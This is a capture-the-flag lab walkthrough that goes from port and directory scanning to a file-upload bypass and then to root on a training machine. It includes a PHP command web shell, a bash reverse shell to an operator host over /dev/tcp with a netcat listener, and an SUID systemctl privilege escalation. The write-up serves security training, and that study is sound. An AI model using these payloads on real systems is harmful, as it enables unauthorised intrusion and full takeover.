# 1. Reconnaissance and Initial Enumeration

## Step 1.1: Nmap Scan
Use Nmap to scan the target machine for open ports and services:

```bash
nmap -sC -sV -oN nmap_scan <target_ip>
```

- `-sC`: Runs default scripts.
- `-sV`: Version detection.
- `-oN`: Outputs the results to a file (nmap_scan).

## Step 1.2: Analyze the Results
From the scan, look for:

- **HTTP services**: A web server may be running on port 80 or another port.
- Other important services like **FTP**, **SSH**, or **SMB**.

---

# 2. Web Application Enumeration

Assume we found an HTTP service running on port 3333. Let’s explore the web application.

## Step 2.1: Directory Enumeration
Use a tool like Gobuster to discover hidden directories or files:

```bash
gobuster dir -u http://<target_ip>:3333 -w /path/to/wordlist
```

Look for pages like `/internal/` that might contain important resources, such as an upload page.

## Step 2.2: Interact with the Web Application
Visit `http://<target_ip>:3333/internal/` and inspect the upload functionality:

- Check if there are restrictions on what types of files can be uploaded.

---

# 3. Bypassing File Upload Restrictions

I found the upload page (`/internal/`). The next step is to figure out which file types are allowed.

## Step 3.1: Test Various File Extensions

Using Python, automate the testing of different file extensions to see which ones the server accepts and processes. Here's a Python script to automate the upload:

```python
import requests

# Target URL (upload page)
url = "http://<target_ip>:3333/internal/"

# List of file extensions to test
extensions = ['php', 'php3', 'php4', 'php5', 'phtml']

# Define the file to upload
test_file_content = "File uploaded"
filename = "test"

# Loop through each extension
for ext in extensions:
    if ext == "phtml":
        file_content = '<?php system($_GET["cmd"]); ?>'  # Simple PHP shell
    else:
        file_content = test_file_content

    print(f"[*] Trying to upload {filename}.{ext}")

    # Create the file name with the current extension
    file_to_upload = (f"{filename}.{ext}", file_content, 'application/octet-stream')
    files = {'file': file_to_upload}

    # Send POST request to upload the file
    response = requests.post(url, files=files)

    # Check if upload was successful
    if response.status_code == 200:
        print(f"[+] {filename}.{ext} uploaded successfully!")
    else:
        print(f"[-] Failed to upload {filename}.{ext}")
```

From testing, `.phtml` was accepted and executed, making it the valid extension.

---

# 4. Exploiting the Upload with a Reverse Shell

Now that we know the `.phtml` extension works, let's upload a reverse shell.

## Step 4.1: Modify the Python Script to Upload a Reverse Shell
Modify the script to upload a reverse shell instead of a basic PHP file:

```python
reverse_shell = """<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1'");
?>"""

# Only upload the reverse shell if phtml is accepted
if ext == "phtml":
    file_content = reverse_shell
    print(f"[*] Uploading reverse shell as {filename}.{ext}")
```

## Step 4.2: Set up a Netcat Listener
On your local machine, start a listener to catch the reverse shell:

```bash
nc -lvnp 4444
```

Explanation of the `nc` options:
- `-l`: Listen mode.
- `-v`: Verbose mode.
- `-n`: No DNS lookups.
- `-p`: Specifies the port number.

## Step 4.3: Trigger the Reverse Shell
After the reverse shell is uploaded to:

```bash
http://<target_ip>:3333/internal/uploads/test-revshell.phtml
```

Visit the URL to trigger it. You should receive a shell back in your Netcat listener.

---

# 5. Post-Exploitation and Enumeration

Once we have a reverse shell, start enumerating the system for further exploitation.

## Step 5.1: Stabilize the Shell
To make the reverse shell interactive, spawn a TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Set the terminal environment:

```bash
export TERM=xterm
```

## Step 5.2: Explore the File System
Enumerate the target machine for interesting files. You can start by checking the home directories:

```bash
ls /home/
ls -al
cd /home/bill
getfacl user.txt
file user.txt
cat user.txt
```

---

# 6. Privilege Escalation

After gaining access, the next goal is to escalate privileges to root.

## Step 6.1: Check SUID Binaries
Use `find` to look for SUID binaries, which run with elevated privileges:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Some interesting SUID binaries include:
- `/bin/systemctl`
- `/usr/bin/sudo`
- `/usr/bin/pkexec`

## Step 6.2: Exploit `/bin/systemctl` for Privilege Escalation
First, `cd ~` and then use `TF=$(mktemp).service` to create a malicious service that sets the SUID bit on `/bin/bash`:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"

[Install]
WantedBy=multi-user.target' > $TF

/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

After running this, execute:

```bash
/bin/bash -p
```

This gives you a root shell.

---

# 7. Accessing Flags

Once you have root access, you can access protected files, such as:

- **User flag**: `/home/bill/user.txt`
- **Root flag**: `/root/root.txt`

> **Note**: Bill's `user.txt` file could be read without root privileges.

---

## Conclusion

- I started with reconnaissance to identify open services.
- I found an upload vulnerability in the web app, exploited it to upload a reverse shell, and gained access as `www-data`.
- From there, I performed privilege escalation using SUID binaries to become root.

---

## Information Related to Execute Root Shell

### Sequence of Commands

1. **Link the service**:

```bash
/bin/systemctl link $TF
```

2. **Enable and start the service**:

```bash
/bin/systemctl enable --now $TF
```

3. **Run `bash` with SUID privileges**:

```bash
/bin/bash -p
```

This should give you a root shell (`bash-4.3#`), where you can perform privileged actions.
